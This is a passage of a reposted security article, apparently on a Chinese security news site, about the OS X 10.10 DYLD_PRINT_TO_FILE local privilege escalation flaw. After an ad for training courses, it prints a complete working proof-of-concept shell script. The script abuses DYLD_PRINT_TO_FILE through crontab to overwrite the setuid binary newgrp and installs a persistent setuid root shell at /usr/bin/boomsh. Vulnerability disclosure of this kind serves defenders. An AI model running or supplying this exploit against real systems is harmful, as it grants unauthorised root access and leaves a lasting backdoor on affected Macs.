several OS X and iOS related trainings later this year. If you enjoyed 
this blog post then especially the <em>OS X and iOS Kernel Internals for Security Researchers Training*</em> in October should be of interest for you.</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">Here is a list of the currently planned training courses:</span></p><ul class=" list-paddingleft-2" style="list-style-type: disc;"><li><p style="text-indent: 0em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; color: rgb(0, 176, 80);"><strong>OS X Kernel Internals for Security Researchers Training</strong></span></p></li><li><p style="text-indent: 0em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; color: rgb(0, 176, 80);"><strong>Dates:</strong> 5 Days, 26th-30th October 2015</span></p></li><li><p style="text-indent: 0em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; color: rgb(0, 176, 80);"><strong>Location:</strong> Le Meridien Parkhotel, Frankfurt, Germany</span></p></li><li><p style="text-indent: 0em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; color: rgb(0, 176, 80);"><strong>Instructor:</strong> Stefan Esser</span></p></li><li><p style="text-indent: 0em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; color: rgb(0, 176, 80);"><strong>Language:</strong> English</span></p></li><li><p style="text-indent: 0em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; color: rgb(0, 176, 80);"><strong>Capacity:</strong> 15</span></p></li><li><p style="text-indent: 0em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; color: rgb(0, 176, 80);"><strong>More Info:</strong> </span><a style="text-decoration: underline; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; color: rgb(0, 176, 80);" href="https://www.sektioneins.de/en/blog/15-07-06-trainingFrankfurt.html"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; color: rgb(0, 176, 80);">https://www.sektioneins.de/en/blog/15-07-06-trainingFrankfurt.html</span></a></p></li><li><p style="text-indent: 0em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; color: rgb(0, 176, 80);"><strong>iOS Kernel Exploitation Training in Frankfurt, Germany</strong></span></p></li><li><p style="text-indent: 0em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; color: rgb(0, 176, 80);"><strong>Dates:</strong> 5 Days, 23rd-27th November 2015</span></p></li><li><p style="text-indent: 0em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; color: rgb(0, 176, 80);"><strong>Location:</strong> Le Meridien Parkhotel, Frankfurt, Germany</span></p></li><li><p style="text-indent: 0em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; color: rgb(0, 176, 80);"><strong>Instructor:</strong> Stefan Esser</span></p></li><li><p style="text-indent: 0em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; color: rgb(0, 176, 80);"><strong>Language:</strong> English</span></p></li><li><p style="text-indent: 0em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; color: rgb(0, 176, 80);"><strong>Capacity:</strong> 15</span></p></li><li><p style="text-indent: 0em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; color: rgb(0, 176, 80);"><strong>More Info:</strong> </span><a style="text-decoration: underline; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; color: rgb(0, 176, 80);" href="https://www.sektioneins.de/en/blog/15-06-08-trainingFrankfurt.html"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; color: rgb(0, 176, 80);">https://www.sektioneins.de/en/blog/15-06-08-trainingFrankfurt.html</span></a></p></li><li><p style="text-indent: 0em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; color: rgb(0, 176, 80);"><strong>Development of Secure iOS Applications Training</strong></span></p></li><li><p style="text-indent: 0em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; color: rgb(0, 176, 80);"><strong>Dates:</strong> 3 Days, 21th-23rd October 2015</span></p></li><li><p style="text-indent: 0em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; color: rgb(0, 176, 80);"><strong>Location:</strong> Le Meridien Parkhotel, Frankfurt, Germany</span></p></li><li><p style="text-indent: 0em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; color: rgb(0, 176, 80);"><strong>Instructor:</strong> Stefan Horst, Stefan Esser</span></p></li><li><p style="text-indent: 0em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; color: rgb(0, 176, 80);"><strong>Language:</strong> English</span></p></li><li><p style="text-indent: 0em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; color: rgb(0, 176, 80);"><strong>Capacity:</strong> 15</span></p></li><li><p style="text-indent: 0em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; color: rgb(0, 176, 80);"><strong>More Info:</strong> </span><a style="text-decoration: underline; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; color: rgb(0, 176, 80);" href="https://www.sektioneins.de/en/blog/15-06-07-ios-dev-training-october.html"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; color: rgb(0, 176, 80);">https://www.sektioneins.de/en/blog/15-06-07-ios-dev-training-october.html</span></a></p></li></ul><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">The full Proof of Concept Exploit</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">The following code is a working proof of concept exploit for this 
issue that uses the previously discussed methods to gives the executing 
user a local root shell and for convenience installs another root shell 
in <strong>/usr/bin/boomsh</strong> for easier root access in the future.</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">Please understand that executing this code is dangerous for your 
system, because it installs a root shell. Execute at your own risk only.</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;"></span></p><pre class="brush:bash;toolbar:false">#!/bin/sh
#
#&nbsp;Simple&nbsp;Proof&nbsp;of&nbsp;Concept&nbsp;Exploit&nbsp;for&nbsp;the&nbsp;DYLD_PRINT_TO_FILE
#&nbsp;local&nbsp;privilege&nbsp;escalation&nbsp;vulnerability&nbsp;in&nbsp;OS&nbsp;X&nbsp;10.10&nbsp;-&nbsp;10.10.4
#
#&nbsp;(C)&nbsp;Copyright&nbsp;2015&nbsp;Stefan&nbsp;Esser&nbsp;&lt;stefan.esser@sektioneins.de&gt;
#
#&nbsp;Wait&nbsp;months&nbsp;for&nbsp;a&nbsp;fix&nbsp;from&nbsp;Apple&nbsp;or&nbsp;install&nbsp;the&nbsp;following&nbsp;KEXT&nbsp;as&nbsp;protection
#&nbsp;https://github.com/sektioneins/SUIDGuard
#
#&nbsp;Use&nbsp;at&nbsp;your&nbsp;own&nbsp;risk.&nbsp;This&nbsp;copies&nbsp;files&nbsp;around&nbsp;with&nbsp;root&nbsp;permissions,
#&nbsp;overwrites&nbsp;them&nbsp;and&nbsp;deletes&nbsp;them&nbsp;afterwards.&nbsp;Any&nbsp;glitch&nbsp;could&nbsp;corrupt&nbsp;your
#&nbsp;system.&nbsp;So&nbsp;you&nbsp;have&nbsp;been&nbsp;warned.
SUIDVICTIM=/usr/bin/newgrp
#&nbsp;why&nbsp;even&nbsp;try&nbsp;to&nbsp;prevent&nbsp;a&nbsp;race&nbsp;condition?
TARGET=`pwd`/tmpXXXXX
rm&nbsp;-rf&nbsp;$TARGET
mkdir&nbsp;$TARGET
cat&nbsp;&lt;&lt;&nbsp;EOF&nbsp;&gt;&nbsp;$TARGET/boomsh.c
#include&nbsp;&lt;stdio.h&gt;
#include&nbsp;&lt;stdlib.h&gt;
#include&nbsp;&lt;unistd.h&gt;
int&nbsp;main()
{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;setuid(0);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;setgid(0);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;system(&quot;/bin/bash&nbsp;-i&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;done.\n&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;0;
}
EOF
cat&nbsp;&lt;&lt;&nbsp;EOF&nbsp;&gt;&nbsp;$TARGET/overwrite.c
#include&nbsp;&lt;sys/types.h&gt;
#include&nbsp;&lt;fcntl.h&gt;
#include&nbsp;&lt;unistd.h&gt;
#include&nbsp;&lt;stdlib.h&gt;
#include&nbsp;&lt;stdio.h&gt;
int&nbsp;main(int&nbsp;argc,&nbsp;char&nbsp;**argv)
{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;fd;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;buffer[1024];
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ssize_t&nbsp;toread,&nbsp;numread;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ssize_t&nbsp;numwritten;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ssize_t&nbsp;size;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;disable&nbsp;O_APPEND&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fcntl(3,&nbsp;F_SETFL,&nbsp;0);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lseek(3,&nbsp;0,&nbsp;SEEK_SET);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;write&nbsp;file&nbsp;into&nbsp;it&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fd&nbsp;=&nbsp;open(
EOF
echo&nbsp;&quot;\&quot;$TARGET/boomsh\&quot;&quot;&nbsp;&gt;&gt;&nbsp;$TARGET/overwrite.c
cat&nbsp;&lt;&lt;&nbsp;EOF&nbsp;&gt;&gt;&nbsp;$TARGET/overwrite.c
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;,&nbsp;O_RDONLY,&nbsp;0);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(fd&nbsp;&gt;&nbsp;0)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;determine&nbsp;size&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;size&nbsp;=&nbsp;lseek(fd,&nbsp;0,&nbsp;SEEK_END);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lseek(fd,&nbsp;0,&nbsp;SEEK_SET);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;(size&nbsp;&gt;&nbsp;0)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(size&nbsp;&gt;&nbsp;sizeof(buffer))&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;toread&nbsp;=&nbsp;sizeof(buffer);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;toread&nbsp;=&nbsp;size;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;numread&nbsp;=&nbsp;read(fd,&nbsp;&amp;buffer,&nbsp;toread);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(numread&nbsp;&lt;&nbsp;toread)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fprintf(stderr,&nbsp;&quot;problem&nbsp;reading\n&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_exit(2);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;numwritten&nbsp;=&nbsp;write(3,&nbsp;&amp;buffer,&nbsp;numread);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(numread&nbsp;!=&nbsp;numwritten)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fprintf(stderr,&nbsp;&quot;problem&nbsp;writing\n&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_exit(2);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;size&nbsp;-=&nbsp;numwritten;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fsync(3);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;close(fd);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fprintf(stderr,&nbsp;&quot;Cannot&nbsp;open&nbsp;for&nbsp;reading\n&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;0;
}
EOF
cp&nbsp;$SUIDVICTIM&nbsp;$TARGET/backup
gcc&nbsp;-o&nbsp;$TARGET/overwrite&nbsp;$TARGET/overwrite.c
gcc&nbsp;-o&nbsp;$TARGET/boomsh&nbsp;$TARGET/boomsh.c
EDITOR=$TARGET/overwrite&nbsp;DYLD_PRINT_TO_FILE=$SUIDVICTIM&nbsp;crontab&nbsp;-e&nbsp;2&gt;&nbsp;/dev/null
echo&nbsp;&quot;cp&nbsp;$TARGET/boomsh&nbsp;/usr/bin/boomsh;&nbsp;chmod&nbsp;04755&nbsp;/usr/bin/boomsh&nbsp;&quot;&nbsp;|&nbsp;$SUIDVICTIM&nbsp;&gt;&nbsp;/dev/null&nbsp;2&gt;&nbsp;/dev/null
echo&nbsp;&quot;cp&nbsp;$TARGET/backup&nbsp;$SUIDVICTIM&quot;&nbsp;|&nbsp;/usr/bin/boomsh&nbsp;&gt;&nbsp;/dev/null&nbsp;2&gt;&nbsp;/dev/null
rm&nbsp;-rf&nbsp;$TARGET
/usr/bin/boomsh</pre></p>
                <hr/>
                <p style="text-align: center;">
                    <img src="http://bobao.360.cn/img/app.jpeg"/>
                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
                </p>
                                <p>本文转载自 <br/><a class="text-more" href="https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html" target="_blank">原文链接：https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html</a></p>
                            </div>
            <div style="margin-top: 20px;background-color:#FFFFFF">
    <input type="hidden" id="detail_title" name="detail_title" value="OS X 10.10 DYLD_PRINT_TO_FILE本地提权漏洞（含EXP） - 安全客 - 有思想的安全新媒体" />
    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
    <a name="mao"></a>
    <div class="reg-log mobile-hiden">
        <div class="" id="userTo">   
            <div id="to-list" class="input-text" style="">
                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
                <ul id="preadded" style="display:none">       
                </ul>
                <div id="to-auto" style="width: 200px">
                    <ul id="feed">
                    </ul>
                </div>
            </div>
        </div>
        <input type="hidden" id="source-id" value="543" />
        <input type="hidden" id="source-type" value="learning" />
        <input type="hidden" id="post-comment-url" value="/comment/add" />
        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
        <input type="hidden" id="stoken_comment_set" value="64d932c9bb50dc5a83db601d9b02e735">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
            </div>
    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />

        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
    </div>


    <div class="clearfix"></div>
    <div class="comments">
        <div class="comments-head">
            <span class="title">用户评论</span>
        </div>
                <div class="comment-none alarm-info bg-primary">无任何评论</div>
            </div>
</div>
<script>
    $(function () {
        $('.anonymous-comment').click(function () {
            $(".join").hide();
            $(".reg-log textarea").first().removeAttr("disabled").show();
            $('#use_nickname').val('1');
//            $('#trigger-nickname').attr('checked', true);
            $('#trigger-nickname').trigger('click');
        });
        //为所有复选框绑定事件
//        checkbox_on_click();
        //ajax随机获取昵称
//        randnicknameajax(0);
        //ajax检测登录状态
        comment_check_login();
    });



    function input_checkbox(flag) {
        $('input:checkbox').each(function () {
            var value = flag ? 1 : 0;
            $(this).prop('checked', flag);
            $(this).val(value);
        });
    }

//ajax随机获取昵称
    function randnicknameajax(flag) {
        $.ajax({
            type: 'POST',
            url: $('#post-nickname-url-ajax').val(),
            data: {limit: 1, flag: flag},
            dataType: "json",
            success: function (data) {
                $('#nick-name').val(data.data[0]);
                _nick_name=data.data[0];
            }
        });
    }
    $();
//ajax检测登录状态
    function comment_check_login() {
        $.ajax({
            type: 'POST',
            url: $('#post-check-login-url-ajax').val(),
            data: {},
            dataType: "json",
            success: function (data) {
                if (data.success) {
                    $('.join').hide();
                    $(".reg-log textarea").first().removeAttr("disabled").show();
                    $("#span_use_nickname").show();
                    $('#use_nickname').val('0');
                    $('#use_nickname').attr('checked', false);
                }
            }
        });
    }
</script>        </div>
    </div>
    <div class="side-bar">
        <div class="mod hot-news">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
    </div>
    <ul class="links-list">
                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
                                <li><a href="/learning/detail/4424.html" alt="【知识】9月16日 - 每日安全知识热点" target="_blank">【知识】9月16日 - 每日安全知识热...</a></li>
                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
            </ul>
</div>        <!-- 友情链接 -->
        <div class="mod blog-links mobile-hide">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
        <a href="/links/index.html" class="more">更多<i></i></a>
    </div>
        <ul class="links-list">
                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
            </ul>
    </div>
        <!-- 联系我们 -->
        <div class="mod contact mobile-hide" style="text-align:center">
    <div class="head-bar clearfix">
        <h2><i></i><span>关注我们</span></h2>
    </div>
    <!-- 微信关注 -->
    <ul class="contact-way">
        <li><a>微信关注</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
    <!-- APP下载 -->
    <ul class="contact-way">
        <li><a>安全播报APP</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
</div>

    </div>
</div>

<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/common.js?v=4.5"></script>
<script>$(function() {sync_count('comment');});</script>


<!-- 语法高亮 -->
<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
    </div>

        <div class="footer">
        <div class="friend-link">
            <a href="http://www.360.cn/" target="_blank">360首页</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">关于我们</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">联系我们</a>
            <span>|</span>
            <a href="/links/index.html" target="_blank">友情链接</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">招贤纳士</a>
        </div>
        <div class="copy">
            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
        </div>
    </div>
    
</div>

<!--奇舞团统计-->

<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
<script>
    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
</script>

<div class="hide">
    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
</div>
<div class="backToTop_wrap off">
    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
</div>
<script>
    var $backToTop_wrap = $(".backToTop_wrap"),
        $backToTop_btn = $("#back_to_top");

    if ($(window).scrollTop() > 100) {
        $backToTop_wrap.removeClass("off");
    }
    else {
        $backToTop_wrap.addClass("off");
    }

    $(window).on("scroll", function () {
        if ($(this).scrollTop() > 100) {
            $backToTop_wrap.removeClass("off");
        }
        else {
            $backToTop_wrap.addClass("off");
        }
    });

    $backToTop_btn.on("click", function () {
        $("html, body").animate({scrollTop: 0}, 120);
    });

    $(function () {
        var navlist = $('.nav-list > li');

        navlist.each(function () {
            $(this).on('mouseenter', function () {
                $(this).addClass('selected');
            });

            $(this).on('mouseleave', function () {
                $(this).removeClass('selected');
            });
        });
    })
</script>



</body>
</html>
